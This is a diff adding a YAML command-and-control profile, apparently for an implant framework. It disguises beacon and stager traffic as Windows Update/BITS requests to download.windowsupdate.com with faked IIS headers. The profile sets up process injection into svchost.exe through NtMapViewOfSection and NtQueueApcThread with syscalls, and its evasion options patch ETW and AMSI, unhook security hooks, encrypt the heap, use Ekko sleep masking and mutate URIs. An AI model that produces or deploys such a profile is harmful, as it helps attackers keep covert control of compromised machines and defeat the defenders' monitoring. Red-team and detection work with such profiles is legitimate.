@@ -1,0 +1,84 @@
+name: microsoft-update
+description: Windows Update / BITS style traffic
+sleep_time: 90
+jitter: 25
+user_agent: "Microsoft BITS/7.8"
+
+http_get:
+  uri:
+    - /windowsupdate/v6/default.aspx
+    - /msdownload/update/v3/static/trustedr/en/authrootstl.cab
+  verb: GET
+  headers:
+    Host: "download.windowsupdate.com"
+    Accept: "*/*"
+    Connection: "Keep-Alive"
+  body:
+    parameter: id
+    base64: true
+  server_output:
+    base64: true
+    headers:
+      Content-Type: "application/octet-stream"
+      Server: "Microsoft-IIS/10.0"
+
+http_post:
+  uri:
+    - /windowsupdate/v6/reportevent.aspx
+    - /windowsupdate/v6/report.aspx
+    - /windowsupdate/v6/tunnel.aspx
+  verb: POST
+  headers:
+    Host: "download.windowsupdate.com"
+    Content-Type: "application/x-www-form-urlencoded"
+  body:
+    base64: true
+    mask: true
+  server_output:
+    base64: true
+    headers:
+      Content-Type: "text/html"
+      Server: "Microsoft-IIS/10.0"
+
+http_stager:
+  uri:
+    - /msdownload/update/software/updt/
+    - /c/msdownload/update/
+  verb: GET
+
+spawn_to:
+  x86: "%windir%\\SysWOW64\\svchost.exe"
+  x64: "%windir%\\System32\\svchost.exe"
+
+process_inject:
+  alloc_type: NtMapViewOfSection
+  execute_type: NtQueueApcThread
+  use_syscalls: true
+
+evasion:
+  patch_etw: true
+  patch_amsi: true
+  unhook_on_load: true
+  heap_encrypt: true
+  syscall_method: indirect
+  sleep_technique: ekko
+  anti_analysis: false
+
+mutation:
+  uri_suffixes:
+    - ""
+    - /en
+    - /en-us
+    - /v6
+  path_tokens:
+    - update
+    - kb
+    - patch
+  prepend_pool:
+    - "update="
+    - "event="
+  append_pool:
+    - "&amp;arch=x64"
+    - "&amp;rev=1"
+  chrome_versions: []
+  mask_key_range: [17, 200]
